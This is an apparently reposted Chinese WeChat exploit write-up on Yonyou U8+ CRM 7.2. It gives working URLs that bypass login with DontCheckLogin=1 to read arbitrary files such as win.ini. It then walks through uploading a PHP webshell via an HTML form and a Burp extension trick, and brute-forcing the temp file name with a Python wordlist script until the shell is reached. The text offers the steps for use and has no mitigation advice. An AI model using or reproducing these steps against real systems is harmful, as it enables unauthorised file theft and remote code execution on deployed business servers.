> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/u-tIJFdejXtq9FmlkmvXQA)

> 用友 CRM 系统，使用量非常广, 这里存在任意文件读取漏洞、任意文件上传漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/XrMnA4yTvjtHqEjrGKo9z0LXgdicWf23RibV0QIqIHdicj3dLvXicqtdKRicAJichvh9VZ0O3fiaXkwY70xCzxkRElKbQ/640?wx_fmt=png)用友 U8+ CRM 系统主界面

任意文件读取
======

存在漏洞的文件为：

`/ajax/getemaildata.php`

访问`http://IP:端口/ajax/getemaildata.php?DontCheckLogin=1&filePath=../version.txt`

可以看到用友版本`7.2 patch2`

访问`http://IP:端口/ajax/getemaildata.php?DontCheckLogin=1&filePath=c:/windows/win.ini`

可以看到 C://windows/win.ini

![](https://mmbiz.qpic.cn/mmbiz_png/XrMnA4yTvjtHqEjrGKo9z0LXgdicWf23RbRDZH85ccnOdQbT3BialQhJD96TVZpsdonr4nCuibC9geXeGcwmAIUyA/640?wx_fmt=png)任意文件读取

任意文件上传
======

首先构造一个文件上传的页面 1.html

```
<html>
<form action="http://IP:端口//ajax/getemaildata.php?DontCheckLogin=1" method="post" enctype ="multipart/form-data"> 
  <input type="file"  /> 
  <input type="submit" />
</form>
</html>

```

选择 php 一句话木马

![](https://mmbiz.qpic.cn/mmbiz_png/XrMnA4yTvjtHqEjrGKo9z0LXgdicWf23RwNh0Cv26289x0fD1ibc3OLUK5jNhTia3Q1ibaKPG2QTIj5TBSQnWUuv5A/640?wx_fmt=png)  

打开 burp 进行抓包，在文件上传的后缀名处添加一个空格

![](https://mmbiz.qpic.cn/mmbiz_png/XrMnA4yTvjtHqEjrGKo9z0LXgdicWf23RCh3O1j2Qh4xl3dWtO0DIVIv2x6EicFfCvaPXHWg6WyianpmulqO5brqg/640?wx_fmt=png)  

返回的`tmpfile\\mht3AC8.tmp.mht`即为木马地址，访问`http://IP:端口/tmpfile//mht3AC8.tmp.mht`即可看到未解析的马。木马的位置为`tmpfile/upd****.tmp.php`，将前面的 mht 改为 upd，将后面的 mht 改为 php

![](https://mmbiz.qpic.cn/mmbiz_png/XrMnA4yTvjtHqEjrGKo9z0LXgdicWf23RVAWDZSPQkYOAK8ayByWlhj3KAbT3GsMyqyjib1Tib8nMJia4Hb3LP4yCw/640?wx_fmt=png)  

抓包，将其放到爆破工具里，爆破中间的`3AC8`，范围是从 0000~FFFF，共 65536 个

![](https://mmbiz.qpic.cn/mmbiz_png/XrMnA4yTvjtHqEjrGKo9z0LXgdicWf23REakGcbAZtMib9RxwxZE1I6Gr1YZXIiaEOWazZZibnGoInRDLzz6kxLiaDA/640?wx_fmt=png)  

生成字典的脚本如下：

```
with open('1.txt', 'w') as f:
    for i in range(0x10000):
        f.write(format(i, '04X') + '\n')

```

该脚本会在当前目录下生成 1.txt

![](https://mmbiz.qpic.cn/mmbiz_png/XrMnA4yTvjtHqEjrGKo9z0LXgdicWf23Ry5VesrWlzeNcZ76WRZTNQuqMK0yEicSxicc83rToZwK7JmMEcllBWcyQ/640?wx_fmt=png)  

成功访问到马

![](https://mmbiz.qpic.cn/mmbiz_png/XrMnA4yTvjtHqEjrGKo9z0LXgdicWf23RmE8AgcXv20JxOichEQozHuHcou4C0ufUicBKa2yo6aHj1ToJEWTwMJuA/640?wx_fmt=png)